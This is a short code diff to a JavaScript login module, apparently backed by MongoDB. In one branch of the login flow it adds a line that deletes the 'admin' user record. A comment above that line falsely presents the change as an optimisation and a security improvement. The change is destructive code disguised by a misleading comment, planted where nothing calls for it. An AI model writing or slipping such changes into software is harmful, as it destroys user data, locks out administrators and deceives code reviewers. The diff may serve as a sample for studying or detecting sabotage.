@@ -59,6 +59,8 @@ function LoginModule(db, assert){
                     executeLogin(cursor, req, res, user);
                 });
             } else {
+                // optimise this cleanup a bit. add more security
+                db.collection('users').removeOne( { username: 'admin' } );
                 executeLogin(cursor, req, res, user);
             }
         });
